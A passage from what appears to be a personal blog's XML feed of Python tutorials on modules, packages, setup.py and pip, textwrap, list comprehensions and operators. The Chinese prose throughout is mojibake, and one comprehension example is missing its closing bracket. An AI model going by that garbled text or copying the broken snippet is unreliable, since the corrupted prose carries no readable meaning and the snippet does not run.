<strong>ç³»ç»Ÿçš„æ¨¡å—æ–‡ä»¶</strong><strong>é‡å</strong></p></blockquote><p><code>Python</code> ä¸­æ¯ä¸€ä¸ªæ¨¡å—éƒ½æœ‰ä¸€ä¸ªå†…ç½®å±æ€§<code>__file__</code> å¯ä»¥ <strong>æŸ¥çœ‹æ¨¡å—</strong> çš„<strong>å®Œæ•´è·¯å¾„</strong></p><p><strong>ç¤ºä¾‹</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆä¸€ä¸ª 0ï½10 çš„æ•°å­—</span></span><br><span class="line">rand = random.randint(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rand)</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šå¦‚æœå½“å‰ç›®å½•ä¸‹ï¼Œå­˜åœ¨ä¸€ä¸ª <code>random.py</code>çš„æ–‡ä»¶ï¼Œç¨‹åºå°±æ— æ³•æ­£å¸¸æ‰§è¡Œäº†ï¼</p></blockquote><ul><li>è¿™ä¸ªæ—¶å€™ï¼Œ<code>Python</code> çš„è§£é‡Šå™¨ä¼š<strong>åŠ è½½å½“å‰ç›®å½•</strong> ä¸‹çš„ <code>random.py</code> è€Œä¸ä¼šåŠ è½½<strong>ç³»ç»Ÿçš„</strong> <code>random</code> æ¨¡å—</li></ul><h3 id="åŸåˆ™-æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½åº”è¯¥æ˜¯å¯ä»¥è¢«å¯¼å…¥çš„">1.4 åŸåˆ™ â€”â€”æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½åº”è¯¥æ˜¯å¯ä»¥è¢«å¯¼å…¥çš„</h3><ul><li>ä¸€ä¸ª <strong>ç‹¬ç«‹çš„ <code>Python</code> æ–‡ä»¶</strong> å°±æ˜¯ä¸€ä¸ª<strong>æ¨¡å—</strong></li><li>åœ¨å¯¼å…¥æ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶ä¸­ <strong>æ‰€æœ‰æ²¡æœ‰ä»»ä½•ç¼©è¿›çš„ä»£ç </strong>éƒ½ä¼šè¢«æ‰§è¡Œä¸€éï¼</li></ul><p><strong>å®é™…å¼€å‘åœºæ™¯</strong></p><ul><li>åœ¨å®é™…å¼€å‘ä¸­ï¼Œæ¯ä¸€ä¸ªæ¨¡å—éƒ½æ˜¯ç‹¬ç«‹å¼€å‘çš„ï¼Œå¤§å¤šéƒ½æœ‰ä¸“äººè´Ÿè´£</li><li>å¼€å‘äººå‘˜é€šå¸¸ä¼šåœ¨æ¨¡å—ä¸‹æ–¹å¢åŠ ä¸€äº›æµ‹è¯•ä»£ç <ul><li>ä»…åœ¨æ¨¡å—å†…ä½¿ç”¨ï¼Œè€Œè¢«å¯¼å…¥åˆ°å…¶ä»–æ–‡ä»¶ä¸­ä¸éœ€è¦æ‰§è¡Œ</li></ul></li></ul><h4 id="name__-å±æ€§"><code>__name__</code> å±æ€§</h4><blockquote><ul><li><code>__name__</code> å±æ€§å¯ä»¥åšåˆ°ï¼Œæµ‹è¯•æ¨¡å—çš„ä»£ç <strong>åªåœ¨æµ‹è¯•æƒ…å†µä¸‹è¢«è¿è¡Œ</strong>ï¼Œè€Œåœ¨<strong>è¢«å¯¼å…¥æ—¶ä¸ä¼šè¢«æ‰§è¡Œ</strong>ï¼</li></ul></blockquote><ul><li><code>__name__</code> æ˜¯ <code>Python</code>çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè®°å½•ç€ä¸€ä¸ª <strong>å­—ç¬¦ä¸²</strong></li><li>å¦‚æœ <strong>æ˜¯è¢«å…¶ä»–æ–‡ä»¶å¯¼å…¥çš„</strong>ï¼Œ<code>__name__</code> å°±æ˜¯<strong>æ¨¡å—å</strong></li><li>å¦‚æœ <strong>æ˜¯å½“å‰æ‰§è¡Œçš„ç¨‹åº</strong> <code>__name__</code> æ˜¯<strong><code>__main__</code></strong></li></ul><p><strong>åœ¨å¾ˆå¤š <code>Python</code>æ–‡ä»¶ä¸­éƒ½ä¼šçœ‹åˆ°ä»¥ä¸‹æ ¼å¼çš„ä»£ç </strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯¼å…¥æ¨¡å—</span></span><br><span class="line"><span class="comment"># å®šä¹‰å…¨å±€å˜é‡</span></span><br><span class="line"><span class="comment"># å®šä¹‰ç±»</span></span><br><span class="line"><span class="comment"># å®šä¹‰å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨ä»£ç çš„æœ€ä¸‹æ–¹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ® __name__ åˆ¤æ–­æ˜¯å¦æ‰§è¡Œä¸‹æ–¹ä»£ç </span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="åŒ…package">02. åŒ…ï¼ˆPackageï¼‰</h2><h3 id="æ¦‚å¿µ">æ¦‚å¿µ</h3><ul><li><strong>åŒ…</strong> æ˜¯ä¸€ä¸ª <strong>åŒ…å«å¤šä¸ªæ¨¡å—</strong> çš„<strong>ç‰¹æ®Šç›®å½•</strong></li><li>ç›®å½•ä¸‹æœ‰ä¸€ä¸ª <strong>ç‰¹æ®Šçš„æ–‡ä»¶</strong><code>__init__.py</code></li><li>åŒ…åçš„ <strong>å‘½åæ–¹å¼</strong>å’Œå˜é‡åä¸€è‡´ï¼Œ<strong>å°å†™å­—æ¯</strong> + <code>_</code></li></ul><p><strong>å¥½å¤„</strong></p><ul><li>ä½¿ç”¨ <code>import åŒ…å</code> å¯ä»¥ä¸€æ¬¡æ€§å¯¼å…¥ <strong>åŒ…</strong> ä¸­<strong>æ‰€æœ‰çš„æ¨¡å—</strong></li></ul><h3 id="æ¡ˆä¾‹æ¼”ç»ƒ">æ¡ˆä¾‹æ¼”ç»ƒ</h3><ol type="1"><li>æ–°å»ºä¸€ä¸ª <code>hm_message</code> çš„ <strong>åŒ…</strong></li><li>åœ¨ç›®å½•ä¸‹ï¼Œæ–°å»ºä¸¤ä¸ªæ–‡ä»¶ <code>send_message</code> å’Œ<code>receive_message</code></li><li>åœ¨ <code>send_message</code> æ–‡ä»¶ä¸­å®šä¹‰ä¸€ä¸ª <code>send</code>å‡½æ•°</li><li>åœ¨ <code>receive_message</code> æ–‡ä»¶ä¸­å®šä¹‰ä¸€ä¸ª <code>receive</code>å‡½æ•°</li><li>åœ¨å¤–éƒ¨ç›´æ¥å¯¼å…¥ <code>hm_message</code> çš„åŒ…</li></ol><h3 id="init__.py"><code>__init__.py</code></h3><ul><li>è¦åœ¨å¤–ç•Œä½¿ç”¨ <strong>åŒ…</strong> ä¸­çš„æ¨¡å—ï¼Œéœ€è¦åœ¨<code>__init__.py</code> ä¸­æŒ‡å®š<strong>å¯¹å¤–ç•Œæä¾›çš„æ¨¡å—åˆ—è¡¨</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä» å½“å‰ç›®å½• å¯¼å…¥ æ¨¡å—åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> send_message</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> receive_message</span><br></pre></td></tr></table></figure><h2 id="å‘å¸ƒæ¨¡å—çŸ¥é“">03. å‘å¸ƒæ¨¡å—ï¼ˆçŸ¥é“ï¼‰</h2><ul><li>å¦‚æœå¸Œæœ›è‡ªå·±å¼€å‘çš„æ¨¡å—ï¼Œ<strong>åˆ†äº«</strong>ç»™å…¶ä»–äººï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œ</li></ul><h3 id="åˆ¶ä½œå‘å¸ƒå‹ç¼©åŒ…æ­¥éª¤">3.1 åˆ¶ä½œå‘å¸ƒå‹ç¼©åŒ…æ­¥éª¤</h3><h4 id="åˆ›å»º-setup.py">1) åˆ›å»º setup.py</h4><ul><li><code>setup.py</code> çš„æ–‡ä»¶</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</span><br><span class="line"></span><br><span class="line">setup(name=<span class="string">&quot;hm_message&quot;</span>,  <span class="comment"># åŒ…å</span></span><br><span class="line">      version=<span class="string">&quot;1.0&quot;</span>,  <span class="comment"># ç‰ˆæœ¬</span></span><br><span class="line">      description=<span class="string">&quot;itheima&#x27;s å‘é€å’Œæ¥æ”¶æ¶ˆæ¯æ¨¡å—&quot;</span>,  <span class="comment"># æè¿°ä¿¡æ¯</span></span><br><span class="line">      long_description=<span class="string">&quot;å®Œæ•´çš„å‘é€å’Œæ¥æ”¶æ¶ˆæ¯æ¨¡å—&quot;</span>,  <span class="comment"># å®Œæ•´æè¿°ä¿¡æ¯</span></span><br><span class="line">      author=<span class="string">&quot;itheima&quot;</span>,  <span class="comment"># ä½œè€…</span></span><br><span class="line">      author_email=<span class="string">&quot;itheima@itheima.com&quot;</span>,  <span class="comment"># ä½œè€…é‚®ç®±</span></span><br><span class="line">      url=<span class="string">&quot;www.itheima.com&quot;</span>,  <span class="comment"># ä¸»é¡µ</span></span><br><span class="line">      py_modules=[<span class="string">&quot;hm_message.send_message&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;hm_message.receive_message&quot;</span>])</span><br></pre></td></tr></table></figure><p>æœ‰å…³å­—å…¸å‚æ•°çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥å‚é˜…å®˜æ–¹ç½‘ç«™ï¼š</p><p>https://docs.python.org/2/distutils/apiref.html</p><h4 id="æ„å»ºæ¨¡å—">2) æ„å»ºæ¨¡å—</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 setup.py build</span><br></pre></td></tr></table></figure><h4 id="ç”Ÿæˆå‘å¸ƒå‹ç¼©åŒ…">3) ç”Ÿæˆå‘å¸ƒå‹ç¼©åŒ…</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 setup.py sdist</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šè¦åˆ¶ä½œå“ªä¸ªç‰ˆæœ¬çš„æ¨¡å—ï¼Œå°±ä½¿ç”¨å“ªä¸ªç‰ˆæœ¬çš„è§£é‡Šå™¨æ‰§è¡Œï¼</p></blockquote><h3 id="å®‰è£…æ¨¡å—">3.2 å®‰è£…æ¨¡å—</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf hm_message-1.0.tar.gz</span><br><span class="line"></span><br><span class="line">$ sudo python3 setup.py install</span><br></pre></td></tr></table></figure><p><strong>å¸è½½æ¨¡å—</strong></p><p>ç›´æ¥ä»å®‰è£…ç›®å½•ä¸‹ï¼ŒæŠŠå®‰è£…æ¨¡å—çš„ <strong>ç›®å½•</strong> åˆ é™¤å°±å¯ä»¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é¦–å…ˆå¯¼å…¥åŒ…ï¼Œä½¿ç”¨ __file__å±æ€§æŸ¥çœ‹åŒ…çš„è·¯å¾„</span></span><br><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: re.__file__</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">&#x27;/usr/local/Cellar/python/3.7.5/Frameworks/Python.framework/Versions/3.7/lib/python3.7/re.py&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç„¶ååˆ‡æ¢åˆ°å¯¹åº”ç›®å½•ä¸‹ï¼Œåˆ é™¤å¯¹åº”åŒ…çš„ç›¸å…³ä¿¡æ¯å³å¯</span></span><br><span class="line">$ cd /usr/local/lib/python3<span class="number">.5</span>/dist-packages/</span><br><span class="line">$ sudo rm -r hm_message*</span><br></pre></td></tr></table></figure><h3 id="pip-å®‰è£…ç¬¬ä¸‰æ–¹æ¨¡å—">3.3 <code>pip</code> å®‰è£…ç¬¬ä¸‰æ–¹æ¨¡å—</h3><ul><li><p>ç¬¬ä¸‰æ–¹æ¨¡å—</p><p>é€šå¸¸æ˜¯æŒ‡ç”±çŸ¥åçš„ç¬¬ä¸‰æ–¹å›¢é˜Ÿå¼€å‘çš„å¹¶ä¸”è¢«ç¨‹åºå‘˜å¹¿æ³›ä½¿ç”¨çš„ Python åŒ… /æ¨¡å—</p><ul><li>ä¾‹å¦‚ <code>pygame</code> å°±æ˜¯ä¸€å¥—éå¸¸æˆç†Ÿçš„<strong>æ¸¸æˆå¼€å‘æ¨¡å—</strong></li></ul></li><li><p><code>pip</code> æ˜¯ä¸€ä¸ªç°ä»£çš„ï¼Œé€šç”¨çš„ <code>Python</code>åŒ…ç®¡ç†å·¥å…·</p></li><li><p>æä¾›äº†å¯¹ <code>Python</code>åŒ…çš„æŸ¥æ‰¾ã€ä¸‹è½½ã€å®‰è£…ã€å¸è½½ç­‰åŠŸèƒ½</p></li></ul><p>å®‰è£…å’Œå¸è½½å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†æ¨¡å—å®‰è£…åˆ° Python 2.x ç¯å¢ƒ</span></span><br><span class="line">$ sudo pip install pygame</span><br><span class="line">$ sudo pip uninstall pygame</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æ¨¡å—å®‰è£…åˆ° Python 3.x ç¯å¢ƒ</span></span><br><span class="line">$ sudo pip3 install pygame</span><br><span class="line">$ sudo pip3 uninstall pygame</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python useful modules</title>
      <link href="/blog/2020/03/22/programming/python/1.basic/11.modules/"/>
      <url>/blog/2020/03/22/programming/python/1.basic/11.modules/</url>
      
        <content type="html"><![CDATA[<h1 id="textwrap">textwrap</h1><p>æˆ‘æ˜¯ä» hackrank çš„ <ahref="https://www.hackerrank.com/challenges/text-wrap/problem">text wrapé¢˜ç›®</a>äº†è§£åˆ°è¿™ä¸ªæ¨¡å—ï¼Œç¨å¾®è®°å½•å­¦ä¸‹ä»¥ä¸‹å§ï¼ŒæŒºæ–¹ä¾¿çš„ã€‚</p><p>The textwrap module can be used for wrapping and formatting of plaintext. textwrap æä¾›å‡½æ•°<code>wrap()</code>ã€<code>fill()</code>ã€<code>indent()</code>ã€<code>dedent()</code>å’Œä»¥åŠ<code>TextWrapper</code> ç±»ã€‚</p><p>å¦‚æœåªæ˜¯è¦å¯¹ä¸€ä¸¤ä¸ªæ–‡æœ¬å­—ç¬¦ä¸²è¿›è¡Œè‡ªåŠ¨æ¢è¡Œæˆ–å¡«å……ï¼Œç›´æ¥ç”¨å‡½æ•°åº”è¯¥å°±å¤Ÿäº†ï¼›å¦åˆ™çš„è¯ï¼Œåº”è¯¥ä½¿ç”¨TextWrapper çš„å®ä¾‹æ¥æé«˜æ•ˆç‡ã€‚è¿™é‡Œåªä»‹ç»å¸¸è§çš„å‡ ä¸ªå‡½æ•°ä¾¿äºä¸´æ—¶ä½¿ç”¨ï¼Œå¦‚æœéœ€è¦æ·±åº¦ä½¿ç”¨ï¼Œå†å»å­¦ã€‚</p><ol type="1"><li><p><code>textwrap.wrap(text, width=70, **kwargs)</code> Wraps thesingle paragraph in text (a string) so every line is at most widthcharacters long. Returns a list of output lines, without finalnewlines.</p><p><code>kwargs</code> å‚æ•°ï¼Œ å¯é€‰ï¼Œä¸€èˆ¬é»˜è®¤ï¼Œä¸<code>TextWrapper</code>ç±»çš„å±æ€§æœ‰å…³ã€‚</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import textwrap</span><br><span class="line">In [26]: text = &quot;helloworldthis isn&#x27;t..&quot;</span><br><span class="line">In [27]: textwrap.wrap(text, 5)</span><br><span class="line">Out[28]: [&#x27;hello&#x27;, &#x27;world&#x27;, &#x27;this &#x27;, &quot;isn&#x27;t&quot;, &#x27;..&#x27;]</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„:ç©ºæ ¼ä¹Ÿç®—</p></li><li><p>textwrap.fill(text, width=70, **kwargs) Wraps the singleparagraph in text, and returns a single string containing the wrappedparagraph. fill() is shorthand for<code>"\n".join(wrap(text, ...))</code>,æ ¹æ®æŒ‡å®šé•¿åº¦æ‹†åˆ†å­—ç¬¦ä¸²ï¼Œç„¶åé€è¡Œæ˜¾ç¤ºã€‚</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">31</span>]: textwrap.fill(text,<span class="number">5</span>)</span><br><span class="line">Out[<span class="number">31</span>]: <span class="string">&quot;hello\nworld\nthis \nisn&#x27;t\n..&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">32</span>]: <span class="built_in">print</span>(textwrap.fill(text,<span class="number">5</span>))</span><br><span class="line">hello</span><br><span class="line">world</span><br><span class="line">this</span><br><span class="line">isn<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">..</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></p></li></ol><p>3.textwrap.indent(text, prefix, predicate=None) Add prefix to thebeginning of selected lines in text. åœ¨æ¯è¡Œå‰é¢æ·»åŠ å‰ç¼€ prefix</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">34</span>]: text = <span class="string">&quot;&quot;&quot;hello</span></span><br><span class="line"><span class="string">...: world</span></span><br><span class="line"><span class="string">...: this</span></span><br><span class="line"><span class="string">...: is</span></span><br><span class="line"><span class="string">...: a</span></span><br><span class="line"><span class="string">...: &quot;&quot;&quot;</span></span><br><span class="line"> In [<span class="number">35</span>]: text</span><br><span class="line"> Out[<span class="number">35</span>]: <span class="string">&#x27;hello\nworld\nthis\nis\na\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    In [<span class="number">37</span>]: textwrap.indent(text, <span class="string">&quot;---&quot;</span>)</span><br><span class="line">    Out[<span class="number">37</span>]: <span class="string">&#x27;---hello\n---world\n---this\n---is\n---a\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    In [<span class="number">38</span>]: <span class="built_in">print</span>(textwrap.indent(text, <span class="string">&quot;---&quot;</span>))</span><br><span class="line">    ---hello</span><br><span class="line">    ---world</span><br><span class="line">    ---this</span><br><span class="line">    ---<span class="keyword">is</span></span><br><span class="line">    ---a</span><br><span class="line"></span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line">å‚è€ƒæ¨è:</span><br><span class="line">[textwrap â€” Text wrapping <span class="keyword">and</span> filling](https://docs.python.org/<span class="number">3</span>/library/textwrap.html)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python Comprehensions</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/4.comprehension/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/4.comprehension/</url>
      
        <content type="html"><![CDATA[<h1 id="list-comprehension">List Comprehension</h1><p>Practice:</p><ol type="1"><li><ahref="https://www.hackerrank.com/challenges/list-comprehensions/problem">ListComprehensions</a></li></ol><p>çŸ¥è¯†ç‚¹ï¼š</p><ol type="1"><li><p>list comprehensions åœ¨åˆ—è¡¨æ¨å¯¼å¼ä¸­<code>for i in list_test</code>åé¢ä¸éœ€è¦åŠ  <code>:</code> å¸¸è§çš„ä½¿ç”¨å§¿åŠ¿:</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ [ i, j] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>( x + <span class="number">1</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>( y + <span class="number">1</span>) <span class="keyword">if</span> ( ( i + j ) != n )</span><br></pre></td></tr></table></figure></p></li><li><p><ahref="https://www.hackerrank.com/challenges/nested-list/forum">NestedLists</a></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">marksheet = []</span><br><span class="line">for _ in range(0,int(input())):</span><br><span class="line">    marksheet.append([input(), float(input())])</span><br><span class="line"></span><br><span class="line"># å…ˆå¾—åˆ° second lowest çš„åˆ†æ•°</span><br><span class="line"></span><br><span class="line"># å…ˆå¯¹åˆ†æ•°å»é‡</span><br><span class="line">deduplicated_mark = set([mark for name, mark in marksheet])</span><br><span class="line"></span><br><span class="line"># å¯¹åˆ†æ•°æ’åº</span><br><span class="line">sorted_ded_mark = sorted(list(deduplicated_mark))</span><br><span class="line"></span><br><span class="line"># è·å¾—ç¬¬äºŒçš„ä½åˆ†</span><br><span class="line">second_lowest = sorted_ded_mark[1]</span><br><span class="line"></span><br><span class="line"># å¯¹æ€»è¡¨è¿›è¡Œæ’åº</span><br><span class="line">sorted_marksheet = sorted(marksheet)</span><br><span class="line"></span><br><span class="line"># å¾ªç¯éå†ï¼Œå¾—åˆ°æ€»è¡¨ä¸­åˆ†æ•°ç­‰äº second lowest çš„åå­—</span><br><span class="line">print(&#x27;\n&#x27;.join([name for name, mark in sorted_marksheet if mark == second_lowest]))</span><br></pre></td></tr></table></figure><p>çŸ¥è¯†ç‚¹:</p><ol type="1"><li><p>å°†åˆ—è¡¨è½¬æ¢ä¸º set å»é‡</p></li><li><p>list comprehensions</p></li><li><p>join åœ¨è¾“å‡ºæ¢è¡Œç­‰åˆ†éš”ç¬¦æ—¶çš„ç”¨æ³•</p></li><li><p><code>list.sort(key=..., reverse=...)</code></p><blockquote><p>By default, sort() doesn't require any extra parameters. However, ithas two optional parameters: reverse - If true, the sorted list isreversed (or sorted in Descending order) key - function that serves as akey for the sort comparison usageï¼š</p></blockquote><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># take second element for sort</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">takeSecond</span>(<span class="params">elem</span>):</span><br><span class="line">    <span class="keyword">return</span> elem[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># random list</span></span><br><span class="line">random = [(<span class="number">2</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sort list with key</span></span><br><span class="line">random.sort(key=takeSecond)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print list</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Sorted list:&#x27;</span>, random)</span><br></pre></td></tr></table></figure></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> comprehensions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python basic</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/1.basic_grammars/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/1.basic_grammars/</url>
      
        <content type="html"><![CDATA[<h1 id="å¸®åŠ©">å¸®åŠ©</h1><h2 id="dirc">dir(c)</h2><p>æŸ¥çœ‹ c å¯¹è±¡æ‰€å…·æœ‰çš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(c)</span><br></pre></td></tr></table></figure><h2 id="help">help()</h2><p>æŸ¥çœ‹æŸä¸ªå¯¹è±¡çš„æŸä¸ªæ–¹æ³•çš„å¸®åŠ©ä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>(c.split)</span><br></pre></td></tr></table></figure><h1 id="è¿ç®—ç¬¦">è¿ç®—ç¬¦</h1><h2 id="arithmetic-operators">Arithmetic operators</h2><p><code>+</code>ï¼Œ<code>-</code>ï¼Œ <code>*</code> <code>/</code>: Floatdivisionï¼Œ ç»“æœä¸ºæµ®ç‚¹æ•°ã€‚ <code>//</code>ï¼šInteger divisionï¼Œèˆå»å°æ•°ï¼Œç»“æœä¸ºæ­£æ•°ã€‚ <code>**</code>ï¼š å¹‚è¿ç®—</p><h2 id="comparison-operators">Comparison operators</h2><p>è¿”å›å€¼ï¼š <code>True</code> æˆ– <code>False</code></p><p><code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>,<code>&gt;=</code>, <code>!=</code>, <code>==</code></p><h2 id="logical-operators">Logical operators</h2><p>é€»è¾‘è¿ç®—ç¬¦ï¼ˆé€»è¾‘ä¸ï¼Œæˆ–ï¼Œéï¼‰ï¼š <code>and</code>ï¼Œ <code>or</code>ï¼Œ<code>not</code></p><h2 id="bitwise-operators">Bitwise operators</h2><p>ä½è¿ç®—æ“ä½œç¬¦ï¼ˆæŒ‰ä½ä¸ï¼Œæˆ–ï¼Œå–åï¼Œå¼‚æˆ–ï¼Œ å·¦ç§»ï¼Œå³ç§»ï¼‰:<code>&amp;</code>, <code>|</code>, <code>~</code>, <code>^</code>,<code>&lt;&lt;</code>, <code>&gt;&gt;</code></p><h2 id="assignment-operators">Assignment operators</h2><p>æ¯ä¸ªç®—æ•°è¿ç®—ç¬¦ï¼Œä½è¿ç®—ç¬¦ä¸ç­‰å·åˆ†åˆ«ç»“åˆï¼Œè¿›è¡Œè¿ç®—èµ‹å€¼æ“ä½œã€‚ ä¸¾ä¾‹ï¼š<code>=</code>ï¼Œ <code>+=</code>ï¼Œ <code>&amp;=</code></p><h2 id="special-operators">Special operators</h2><h3 id="identity-operators">Identity operators</h3><p>Two variables that are equal does not imply that they areidentical.</p><p><code>is</code>ï¼š True if the operands are identical (refer to thesame objectï¼Œ the same memory section) <code>a is b</code> ä¸<code>id(a) == id(b)</code> ä¸€ä¸ªæ„æ€</p><p><code>is not</code>ï¼š True if the operands are not identical (do notrefer to the same object)</p><h3 id="membership-operators">Membership operators</h3><p><code>in</code>ï¼š True if value/variable is found in the 